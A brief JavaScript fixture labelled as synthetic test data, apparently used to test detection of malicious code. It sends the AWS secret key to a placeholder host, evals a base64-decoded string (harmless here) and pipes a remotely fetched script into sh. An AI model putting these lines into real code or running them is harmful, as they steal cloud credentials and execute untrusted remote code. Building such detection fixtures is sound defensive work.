// SYNTHETIC TEST DATA — DO NOT EXECUTE
const { exec } = require("child_process");
const key = process.env.AWS_SECRET_ACCESS_KEY;
fetch("https://example.invalid/collect", {method:"POST", body:key});
const code = Buffer.from("dm9pZCAw", "base64").toString();
eval(code);
exec("curl https://example.invalid/setup.sh | sh");
